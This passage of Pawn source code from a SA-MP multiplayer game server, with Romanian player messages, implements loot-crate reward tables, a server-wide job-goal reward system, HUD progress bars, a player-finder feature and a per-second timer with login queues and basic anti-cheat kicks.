	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}

				case 36,37: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "voucher~n~~b~Millionaires");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium v2 crate and won Milionaires Voucher. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pVoucher][4]++;
					   	save_vouchers(i);
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 38..43: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1277);
					PlayerTextDrawSetString(i, CratePTD[i][1], "sws~n~ticket");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium v2 crate and won SWS Ticket. ))", GetName(i));
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pTickets][4]++;
					   	save_tickete(i);
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 44,45: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 510);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium~n~~g~Mountain Bike");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a premium crate v2 and won Mountain Bike [PREMIUM]. ))", GetName(i)); 
						    SCMTA(COLOR_CLIENT, crateString);
						    GiveVehicle(i, 510, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 46,47: {
		    		amount = loadSkins[e_SKIN_PREMIUMV2][random(sizeof(loadSkins[e_SKIN_PREMIUMV2]))];
		            format(gString, 30, "~y~~h~premium v2~n~skin %d", amount);
		            PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], amount);
		            PlayerTextDrawSetString(i, CratePTD[i][1], gString);
		            PlayerTextDrawBackgroundColor(i, CratePTD[i][0], GetSkinRareCMD(amount));
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
	            		if(!free_skin(i)) {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest skin.");
	            	    } else {
							format(crateString, 120,"(( Crate: %s opened a premium v2 crate and won Skin %d (%s). ))", GetName(i), amount, GetSkinType(amount)); 
						    SCMTA(COLOR_CLIENT, crateString);
						    give_skin(i, amount);
						}	
		            	CrateModel[i] = -1;
						return true;
		            }
				}
				default: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], "money~n~~g~$1.000.000.000");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a premium v2 crate and won $1.000.000.000. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	GivePlayerCash(i, 1000000000);
						CrateModel[i] = -1;
						return true;
				    }
				}
			}

		}
		case 10: {
			switch(random(100)) {
				case 0..3: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1273);
					PlayerTextDrawSetString(i, CratePTD[i][1], "custom house~n~ticket");
					PlayerTextDrawShow(i, CratePTD[i][0]);
					if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won custom house ticket. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					    PlayerInfo[i][pTickets][3]+=1;
						CrateModel[i] = -1;
					}
				}
				case 4..10: {
					amount = RandomEx(1, 750);
		            format(gString, 75, "premium points~n~~y~%dx", amount);
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1247);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won %d Premium Points. ))", GetName(i), amount); 
					    SCMTA(COLOR_CLIENT, crateString);
					    PlayerInfo[i][pPremiumPoints] += amount;
					    UpdateVar(i, "GoldPoints", PlayerInfo[i][pPremiumPoints]);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 11..25: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 415);
					PlayerTextDrawSetString(i, CratePTD[i][1], "premium~n~~g~cheetah");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won Cheetah [PREMIUM]. ))", GetName(i)); 
						    SCMTA(COLOR_CLIENT, crateString);
						    GiveVehicle(i, 415, true);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }				
				}
				case 26..30: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 18647);
					PlayerTextDrawSetString(i, CratePTD[i][1], "RED~n~NEON T.");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won red neon ticket. ))", GetName(i));
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pNeonTickets][5]++;
					   	save_neon_tickets(i);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 31..34: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 18648);
					PlayerTextDrawSetString(i, CratePTD[i][1], "blue~n~neon t.");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won blue neon ticket. ))", GetName(i));
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pNeonTickets][4]++;
					   	save_neon_tickets(i);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 35..37: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 18649);
					PlayerTextDrawSetString(i, CratePTD[i][1], "green~n~neon t.");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won green neon ticket. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pNeonTickets][3]++;
					   	save_neon_tickets(i);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 38..41: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 18650);
					PlayerTextDrawSetString(i, CratePTD[i][1], "yellow~n~neon t.");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won yellow neon ticket. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pNeonTickets][2]++;
					   	save_neon_tickets(i);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 42..45: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 18651);
					PlayerTextDrawSetString(i, CratePTD[i][1], "pink~n~neon t.");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won pink neon ticket. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pNeonTickets][1]++;
					   	save_neon_tickets(i);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 46..49: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 18652);
					PlayerTextDrawSetString(i, CratePTD[i][1], "white~n~neon t.");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won white neon ticket. ))", GetName(i));
					    SCMTA(COLOR_CLIENT, crateString);
					   	PlayerInfo[i][pNeonTickets][0]++;
					   	save_neon_tickets(i);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 50..60: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 473);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~Dinghy");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won Dinghy. ))", GetName(i)); 
						    SCMTA(COLOR_CLIENT, crateString);
						    GiveVehicle(i, 473);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 61..67: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 515);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle~n~~b~roadtrain");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
		            	if(Iter_Count(MyVehicle<i>)<PlayerInfo[i][pSlot]) {
							format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won Roadtrain. ))", GetName(i)); 
						    SCMTA(COLOR_CLIENT, crateString);
						    GiveVehicle(i, 515);
						} else {
	            		    PlayerInfo[i][pCrates][x] ++;
	            		    save_crates(i); 
	            		    SendClientMessage(i, COLOR_CLIENT, ">> CRATE << Ai primit cutia inapoi deoarece nu ai un slot liber pentru acest vehicul.");							
						}
						CrateModel[i] = -1;
						return true;
				    }					
				}
				case 68..73: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 515);
					PlayerTextDrawSetString(i, CratePTD[i][1], "vehicle slot");
					PlayerTextDrawShow(i, CratePTD[i][0]);
					if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won vehicle slot. ))", GetName(i));
					    SCMTA(COLOR_CLIENT, crateString);
						PlayerInfo[i][pSlot] ++;
						CrateModel[i] = -1;
						return true;
					}
				}
				case 74..78: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], "money~n~~g~$696.969.696");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won $696.969.696. ))", GetName(i)); 
					    SCMTA(COLOR_CLIENT, crateString);
					   	GivePlayerCash(i, 696969696);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 79..83: {
					amount = RandomEx(100, 500);
		            format(gString, 75, "gift points~n~~y~%dx", amount);
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1247);
					PlayerTextDrawSetString(i, CratePTD[i][1], gString);
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won %d gift points. ))", GetName(i), amount);
					    SCMTA(COLOR_CLIENT, crateString);
					    PlayerInfo[i][pGiftPoints] += amount;
					    UpdateVar(i, "GiftPoints", PlayerInfo[i][pGiftPoints]);
						CrateModel[i] = -1;
						return true;
				    }
				}
				case 84..90: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 19317);
					PlayerTextDrawSetString(i, CratePTD[i][1], "mp3~n~guitar");
					PlayerTextDrawShow(i, CratePTD[i][0]);
					if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won mp3 guitar. ))", GetName(i), amount);
					    SCMTA(COLOR_CLIENT, crateString);
						CrateModel[i] = -1;
						return true;
				    }
				}
				default: {
					PlayerTextDrawSetPreviewModel(i, CratePTD[i][0], 1274);
					PlayerTextDrawSetString(i, CratePTD[i][1], "money~n~~g~$1.337");
					PlayerTextDrawShow(i, CratePTD[i][0]);
		            if(!CrateTime[i]) {
						format(crateString, 120,"(( Crate: %s opened a Feeling Lucky Today? crate and won $1.337. ))", GetName(i));
					    SCMTA(COLOR_CLIENT, crateString);
					   	GivePlayerCash(i, 1337);
						CrateModel[i] = -1;
						return true;
				    }
				}
		    }
		}
	}
	SetTimerEx("openPlayerCrate", 600, false, "i", i);
	return true;
}


redist::hideCase(playerid, id) {
	for(new i=0;i<3;i++) TextDrawHideForPlayer(playerid, CaseTD[i]);
	for(new i=0;i<9;i++) PlayerTextDrawHide(playerid, CasePTD[i]);
	for(new i=0;i<3;i++) TextDrawHideForPlayer(id, CaseTD[i]);
	for(new i=0;i<9;i++) PlayerTextDrawHide(id, CasePTD[i]);
	CaseBattle[playerid] = CaseBattle[id] = -1;
	player_selected[playerid] = player_selected[id] = 0;
	CrateTime[playerid] = CrateTime[id] = 0;
	CrateModel[playerid] = CrateModel[id] = -1;
	return true;
}
stock CalculateTime(seconds) {
	static string[10];
	format(string, sizeof(string), "%02d:%02d", seconds/60, seconds%60);
	return string;
}
cmd:resetgoal(playerid, params[]) {
	if(PlayerInfo[playerid][pAdmin] < 6) return SendClientMessage(playerid, COLOR_LGREEN, AdminOnly);
	else if(PlayerInfo[playerid][pAdmin] < 4 && TerminatJobGoal==false) return SendClientMessage(playerid, COLOR_LGREEN, AdminOnly);
	resetBigInt(serverGoal);
	TerminatJobGoal = false;
	UpdateJobGoal(0);
	gString[0] = EOS;
	Broadcast(COLOR_CLIENT, "(( Job Goal resetat de administratorul %s. ))", GetName(playerid));
	return true;
}

updatePlayerGoal(playerid, update) {
	PlayerInfo[playerid][pJobGoal] += update;
	UpdateVar(playerid, "goal", PlayerInfo[playerid][pJobGoal]);
	if(togJobGoal[playerid]) {
		SCMf(playerid, COLOR_LGREEN, "GOAL: Ai contribuit cu $%s la job goal (total: $%s).", FormatNumber(update), FormatNumber(PlayerInfo[playerid][pJobGoal]));
		SendClientMessage(playerid, COLOR_LGREEN, "GOAL: Pentru a beneficia de recompensa trebuie sa depui cel putin $5,000 la job goal.");
	}
}

redist::UpdateJobGoal(update) {
	addBytes32(serverGoal, update);
	format(gString, 60, "~y~$%s ~w~/ ~g~$%s", formatBytes(serverGoal), MAXGOALSTR);
	TextDrawSetString(GoalTD[0], gString);

	if !TerminatJobGoal && OPByte(serverGoal, >=, #3333333333) *then {
		foreach(new b : logged_players) {
			if(PlayerInfo[b][pJobGoal]<5000) {
				PlayerInfo[b][pJobGoal] = 0;
				SendClientMessage(b, COLOR_CLIENT, "(( {F9E688}Job Goal{A9C4E4}: Nu ai fost recompensat deoarece nu ai muncit minim $5,000 la job goal! ))");
				continue;
			}
			Broadcast(COLOR_CLIENT, "(( {ffec8b}Job Goal{A9C4E4}: Goal-ul a a atins suma de $3,333,333,333 si a acum este completat. ))", GetName(b));
			Broadcast(COLOR_CLIENT, "(( {ffec8b}Job Goal{A9C4E4}: Acesta va fi resetat automat de catre un administrator. ))", GetName(b));
			SCMf(b, COLOR_CLIENT, "(( {ffec8b}Job Goal{A9C4E4}: Ai fost recompensat cu %d b-points deoarece ai contribuit cu $%s!", PlayerInfo[b][pJobGoal]/5000, FormatNumber(PlayerInfo[b][pJobGoal]));
			PlayerInfo[b][pBPoints] += PlayerInfo[b][pJobGoal]/5000;
			PlayerInfo[b][pJobGoal] = 0;
			UpdateVar(b, "BPoints", PlayerInfo[b][pBPoints]);	
			mysql_format(SQL, gQuery, sizeof(gQuery), "SELECT MAX(goal) as max_goal, `name` as namejob, `ID` as idjob FROM users");
			mysql_tquery(SQL, gQuery, #cache_job_best_jobgoal, #i, b);
		}
		//mysql_tquery(SQL, "UPDATE `users` SET `goal` = '0'");
		TerminatJobGoal = true;
	}
	if(TerminatJobGoal) TextDrawSetString(GoalTD[0], "~y~completed..");
	return true;
}
redist::cache_job_best_jobgoal(playerid) {
	if(cache_num_rows()) {
		new job_goal_name[64], bani_stransi, user_id;
		cache_get_value_name(0, "namejob", job_goal_name, MAX_PLAYER_NAME);        
		cache_get_value_name_int(0, "max_goal", bani_stransi);   
		cache_get_value_name_int(0, "idjob", user_id);          

		Broadcast(COLOR_CLIENT, "(( {ffec8b}Job Goal{A9C4E4}: %s a muncit cel mai mult ($%s) si a fost recompensat cu 100 PP!", job_goal_name, FormatNumber(bani_stransi));

		_query("UPDATE `users` SET `GoldPoints` = `GoldPoints`+100 WHERE `id`='%i'", user_id);
		return true;
	}	 
	return true;
}

stock RepairVehiclePns(i) {
	if(GetPlayerState(i) != PLAYER_STATE_DRIVER || LastPns[i]==-1)
		return true;

	new veh = GetPlayerVehicleID(i);

	PnsTimer[i] = -1;
	SetCameraBehindPlayer(i);
	TogglePlayerControllable(i, true);
	CheckMission(i, 11);
	new carid = FindSpawnID(veh), b = LastPns[i];
	if(carid != -1) SetVehicleHealth(veh, CarInfo[carid][cVip] ? 2000 : 999);
	else SetVehicleHealth(veh, 999);
	ChangeVehicleColorEx(veh, VehicleStats[veh][vColorOne], VehicleStats[veh][vColorTwo]);
	SetVehiclePos(veh, pnsPos[b][0], pnsPos[b][1], pnsPos[b][2]);
	SetVehicleZAngle(veh, pnsPos[b][3]);
	LastPns[i] = -1;
	return true;
}
stock UpdateProgress(playerid, bar) {
	if(!PlayerInfo[playerid][pShowProgress][bar]) return true;
	gString[0] = EOS;
	switch(bar) {
		case 0: {
			format(gString, 55, "Level: %d-%d (%d/%d RP)", PlayerInfo[playerid][pLevel], PlayerInfo[playerid][pLevel]+1, PlayerInfo[playerid][pExp], PlayerInfo[playerid][pLevel]*3);
			PlayerTextDrawSetString(playerid, HudTD[bar], gString);
			PlayerTextDrawShow(playerid, HudTD[bar]);
			SetPlayerProgressBarMaxValue(playerid, HudProgress[playerid][bar], PlayerInfo[playerid][pLevel]*3);
			SetPlayerProgressBarValue(playerid, HudProgress[playerid][bar], PlayerInfo[playerid][pExp]);
			SetPlayerProgressBarColour(playerid, HudProgress[playerid][bar], GetHudColor(PlayerInfo[playerid][pShowProgress][0]));	
		}
		case 1: {
			if(!PlayerInfo[playerid][pJob]) return true;
			new job = PlayerInfo[playerid][pJob]; 

			//if(job==13||job==16) job = 11;
			if(PlayerInfo[playerid][pJobSkill][job] >= 6) format(gString, 127, "Job %s: Skill maxim (6)", JobInfo[job][jName]);
			else if(job==13||job==16) {
				format(gString, 128, "Job %s: %d-%d (%d/%d)", JobInfo[job][jName], PlayerInfo[playerid][pJobSkill][11], PlayerInfo[playerid][pJobSkill][11]+1, PlayerInfo[playerid][pJobSkillPoints][11], GetNeedPoints(playerid, 11));
			}
			else format(gString, 128, "Job %s: %d-%d (%d/%d)", JobInfo[job][jName], PlayerInfo[playerid][pJobSkill][job], PlayerInfo[playerid][pJobSkill][job]+1, PlayerInfo[playerid][pJobSkillPoints][job], GetNeedPoints(playerid, job));
			PlayerTextDrawSetString(playerid, HudTD[bar], gString);
			PlayerTextDrawShow(playerid, HudTD[bar]);
			
			SetPlayerProgressBarMaxValue(playerid, HudProgress[playerid][bar], PlayerInfo[playerid][pJobSkill][job]<6?GetNeedPoints(playerid, job):0);
			SetPlayerProgressBarValue(playerid, HudProgress[playerid][bar], PlayerInfo[playerid][pJobSkillPoints][job]);
			SetPlayerProgressBarColour(playerid, HudProgress[playerid][bar], GetHudColor(PlayerInfo[playerid][pShowProgress][1]));	
		}
	}
	ShowPlayerProgressBar(playerid, HudProgress[playerid][bar]);
	return 1;
}

stock findPlayer(playerid,target=-1,j=-1) {
	target = targetfind[playerid],j=InInteriorID[target];
	if(Spectate[target] != -1) {
		PlayerTextDrawHide(playerid, FindTD);
		PlayerTextDrawHide(playerid, FindSkinTD);
		DisablePlayerCheckpointEx(playerid);
		SendClientMessage(playerid, COLOR_YELLOW, "Acel admin este ocupat! Checkpoint dezactivat.");
		targetfind[playerid] = -1;
		CP[playerid] = 0;
		UsedFind[playerid] = 0;	
		return true;
	}
	if GetPlayerVirtualWorld(playerid) == GetPlayerVirtualWorld(target) *then {
		new Float:x,Float:y,Float:z;
		GetPlayerPos(target,x,y,z);
		SetPlayerCheckpoint(playerid,x,y,z,4);
		format(gString, 128, "~r~%s [%d]~n~~w~~h~distance: ~y~~h~%0.1fm ~n~~b~[%s]", GetName(targetfind[playerid]), targetfind[playerid], GetPlayerDistanceFromPoint(playerid, x,y,z), GetCity(target));
	}
	else {
		switch InInterior[target] do {
			case INVALID_INTERIOR: {
				new Float:x,Float:y,Float:z;
				GetPlayerPos(target,x,y,z);
				SetPlayerCheckpoint(playerid,x,y,z,4);
				format(gString, 128, "~r~%s [%d]~n~~w~~h~distance: ~y~~h~%0.1fm ~n~~b~[%s]", GetName(targetfind[playerid]), targetfind[playerid], GetPlayerDistanceFromPoint(playerid, x,y,z), GetCity(target));
			}
			case BUSINESS_INTERIOR: {
				SetPlayerCheckpoint(playerid,BizzInfo[j][bEntranceX], BizzInfo[j][bEntranceY], BizzInfo[j][bEntranceZ],4);
				format(gString, 128, "~r~%s [%d]~n~~w~~h~distance: ~y~~h~%0.1fm ~n~~b~[%s]", GetName(targetfind[playerid]), targetfind[playerid], GetPlayerDistanceFromPoint(playerid, BizzInfo[j][bEntranceX], BizzInfo[j][bEntranceY], BizzInfo[j][bEntranceZ]), get_city_(BizzInfo[j][bEntranceX], BizzInfo[j][bEntranceY]));
			}
			case HOUSE_INTERIOR: {
				SetPlayerCheckpoint(playerid,HouseInfo[j][hEntrancex],HouseInfo[j][hEntrancey],HouseInfo[j][hEntrancez],4);
				format(gString, 128, "~r~%s [%d]~n~~w~~h~distance: ~y~~h~%0.1fm ~n~~b~[%s]", GetName(targetfind[playerid]), targetfind[playerid], GetPlayerDistanceFromPoint(playerid, HouseInfo[j][hEntrancex],HouseInfo[j][hEntrancey],HouseInfo[j][hEntrancez]), get_city_(HouseInfo[j][hEntrancex],HouseInfo[j][hEntrancey]));
			}
			case HQ_INTERIOR: {
				SetPlayerCheckpoint(playerid,DynamicFactions[j][extX], DynamicFactions[j][extY], DynamicFactions[j][extZ],4);
				format(gString, 128, "~r~%s [%d]~n~~w~~h~distance: ~y~~h~%0.1fm ~n~~b~[%s]", GetName(targetfind[playerid]), targetfind[playerid], GetPlayerDistanceFromPoint(playerid, DynamicFactions[j][fcX],DynamicFactions[j][fcY],DynamicFactions[j][fcZ]), get_city_(DynamicFactions[j][fcX],DynamicFactions[j][fcY]));
			}
			case CLANHQ_INTERIOR: {
				SetPlayerCheckpoint(playerid,ClanHQInfo[j][cPosX],ClanHQInfo[j][cPosY],ClanHQInfo[j][cPosZ],4);
				format(gString, 128, "~r~%s [%d]~n~~w~~h~distance: ~y~~h~%0.1fm ~n~~b~[%s]", GetName(targetfind[playerid]), targetfind[playerid], GetPlayerDistanceFromPoint(playerid, ClanHQInfo[j][cPosX],ClanHQInfo[j][cPosY],ClanHQInfo[j][cPosZ]), get_city_(ClanHQInfo[j][cPosX],ClanHQInfo[j][cPosY]));			
			}
		}
	}
	if(PlayerInfo[playerid][pMember]==11) {
		format(gQuery, 128, "~n~~w~~h~%s~n~%s", IsPlayerInAnyVehicle(target) || GetPlayerSurfingVehicleID(playerid) != INVALID_VEHICLE_ID ? ("on vehicle") : ("on foot"), !GetPVarInt(playerid, "Undercover")?"~r~undercover off!":"~g~undercover on!");
		strcat(gString, gQuery);
	}
	PlayerTextDrawSetString(playerid, FindTD, gString);
	return true;
}

stock InZone(playerid, Float:minX,Float:minY,Float:minZ,Float:maxX,Float:maxY,Float:maxZ,Float:x=0.0,Float:y=0.0,Float:z=0.0)
	return (GetPlayerPos(playerid, x, y, z)&&(x>=minX&&x<=maxX&&y>=minY&&y<=maxY&&z>=minZ&&z<=maxZ));


task Timers[1000]() {
	new 
		string[180], hour, minute, seconds,
		day, month, year,
		Float: ppHealth, Float: ppArmour,
		Float: x, Float: y, Float: z;

	if(!ServerSystem[6]) foreach(new i : Rainbows<3>) ChangeRainbowColors(i);

	if(GiftTime) {
		GiftTime--;
		va_TextDrawSetString(GiftTD[1], "Gift will~n~land in~n~~y~%02d:%02d", (GiftTime / 60), (GiftTime % 60));
		if(!GiftTime) createAirDrop();
	}

	if RulettStatus == 1 *then OnRoulettaUpdate();

	foreach(new idd : PersonalVSpawned) {
		if(IsVehicleOccupied(CarInfo[idd][Spawned])) continue;
		CarInfo[idd][cTime]--;
		if(CarInfo[idd][cTime]) continue;
		if(!CarInfo[idd][cClan]) DestroyPlayerCar(idd, false); 
		else DestroyClanVehicle(idd, false);
		Iter_SafeRemove(PersonalVSpawned, idd, idd);
	}

	for(new i=0;i<6;i++) {
			if(bl_time[i]) {
				bl_time[i]--;
				switch bl_status[i] do {
					case BL_WAITING: {
						format(gString, 60, "waiting for players...~n~~r~00:%02d", bl_time[i]);
						TextDrawSetString(blackjack_time[i], gString);
						if(!bl_time[i]) start_blackjack(i);
					}
					case BL_PROGRESS: {
						format(gString, 70, "it's ~r~%s ~w~~h~turn~n~00:%02d", GetName(bl_turn[i]), bl_time[i]);
						TextDrawSetString(blackjack_time[i], gString);
						if !bl_time[i] *then removePlayerFromBl(bl_turn[i], i);
					}
					case BL_REFRESH: if(!bl_time[i]) dealer_refresh(i);
				}
			}
		}

	gettime(hour, minute, seconds);
	getdate(year, month, day);
    format(gString, 20, "%02d:%02d", hour, minute);
    TextDrawSetString(DataT[0], gString);
    format(gString, 20, ":%02d", seconds);
    TextDrawSetString(DataT[1], gString);
    format(gString, 30, "%d %s", day, MonthName[month-1]);
    TextDrawSetString(DataT[2], gString); 

	if(!minute) PayDay();
	foreach(new i : Player) {
		if(!IsPlayerLogged(i)) {
			if(LoginTime[i][1] != 0) {
				LoginTime[i][1] --;
				if(LoginTime[i][1] <= 0) {
					switch(LoginTime[i][0]) {
						case 1: checkPlayerAccount(i);
						case 2: KickEx(i);
					}
				}
				continue;
			} 
			if(Iter_Count(LoginQueue<0>) < MAX_LOGIN && !Iter_Contains(LoginQueue<0>, i)) {
				Iter_Add(LoginQueue<0>, i),Iter_Remove(LoginQueue<1>, i);
				checkPlayerAccount(i);
			}
			else PlayerLoginQueue(i);
			continue;
		}
		
		if(!IsPlayerLogged(i))
			continue;

		if(ExamTime[i]) {
			ExamTime[i]--;
			format(gString, 30, "~y~00:%02d", ExamTime[i]);
			PlayerTextDrawSetString(i, ExamPTD[i][0], gString);
			if(!ExamTime[i]) {
				SCMf(i, COLOR_WHITE, "{BA0404}Examen: {FFFFFF}Ai picat examenul! (%d/5 intrebari corecte)", StepExam[i]);
				StepExam[i] = 0;
				SetCameraBehindPlayer(i);
				CancelSelectTextDraw(i);
				player_selected[i] = 0;
				for(new rx=0;rx<8;rx++) TextDrawHideForPlayer(i, ExamTD[rx]);
				PlayerTextDrawDestroy(i, ExamPTD[i][0]);
				for(new rx=1;rx<5;rx++) PlayerTextDrawDestroy(i, ExamPTD[i][rx]), PlayerTextID[i][PlayerText:ExamPTD[i][rx]] = -1;
				InExamen[i] = 0;				
			}
		}

		if Spectate[i]!=-1 *then Getspec(i);
		if(DebugClanVehicleTimer[i]) {
			DebugClanVehicleTimer[i]--;
			if(!DebugClanVehicleTimer[i]) {
				new idd = PlayerInfo[i][pCarKey][debugClanVehicle[i]];
				DestroyClanVehicle(idd);
				new rand = random(sizeof DealerCarPos);
				CarInfo[idd][cLocationx] = DealerCarPos[rand][0];
				CarInfo[idd][cLocationx] = DealerCarPos[rand][1];
				CarInfo[idd][cLocationx] = DealerCarPos[rand][2];
				CarInfo[idd][cLocationx] = DealerCarPos[rand][3];
				SpawnClanCar(idd);
				SetPlayerCheckpoint(i, DealerCarPos[rand][0], DealerCarPos[rand][1], DealerCarPos[rand][2], 5.0);
				CP[i] = 53;
			}
		}

		if GetPlayerWeapon(i) *then {
			if(PlayerInfo[i][pLevel] < 3 && !Weapons[i][GetPlayerWeapon(i)]) {
				SendClientMessage(i, COLOR_CLIENT, "You got kicked for using cheats (weapon-cheat (level < 3)).");
				SendClientMessage(i, COLOR_WHITE, "Stop using cheats!");
				KickEx(i);
				continue;
			}
			if GetPlayerWeapon(i) == 21 *then {
				SendClientMessage(i, COLOR_CLIENT, "You got kicked for using cheats (using a jetpack).");
				SendClientMessage(i, COLOR_WHITE, "Stop using cheats!");
				KickEx(i);
				continue;
			}
		}

		if(svfCar[i]) {
			GetPlayerPos(i, x,y,z);
			if(GetVehicleDistanceFromPoint(svfCar[i], x,y,z) > 300 && InInterior[i] == INVALID_INTERIOR && !IsVehicleOccupied(svfCar[i]))
				destroySVF(i);
		}
		if(hideHungry[i]<gettime() && hideHungry[i] !=- 1) PlayerTextDrawHide(i, HungreyTD), hideHungry[i] = -1;

		
		if DMGTimer[i]<gettime() *then {
			PlayerTextDrawHide(i, DMGTD[0]);
			PlayerTextDrawHide(i, DMGTD[1]);
			DMGTimer[i] = -1;
		}

